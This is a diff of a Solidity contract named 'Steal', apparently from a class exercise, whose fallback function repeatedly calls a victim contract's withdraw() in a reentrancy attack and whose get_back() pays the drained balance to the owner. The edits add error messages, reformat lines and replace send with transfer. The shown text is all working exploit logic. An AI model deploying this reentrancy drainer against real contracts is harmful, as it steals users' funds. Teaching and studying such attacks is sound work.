@@ -42,8 +42,8 @@ contract Steal {
     steal to grab funds from Vuln contract
     limiting the amount stolen using steal_count
     */
-    function() payable external {
-        require(steal_count <= max_steal);
+    function() payable external{ 
+        require(steal_count <= max_steal,"Steal count exceeded");
         steal_count++;
         balance += msg.value;
         steal(msg.sender);
@@ -53,7 +53,7 @@ contract Steal {
        Calls the withdraw function in Vuln
      */
     function steal(address _victim) public {
-        (ret2,) = _victim.call(abi.encodeWithSignature("withdraw()"));
+            (ret2,) = _victim.call(abi.encodeWithSignature("withdraw()"));
     }
 
     /*
@@ -63,8 +63,8 @@ contract Steal {
        contract for other students in class to steal.
      */
     function get_back() public {
-        require(msg.sender == owner);
-        require(msg.sender.send(balance));
+        require(msg.sender == owner,"you are not the owner of these funds");
+        msg.sender.transfer(balance);
         balance = 0;
     }
 }
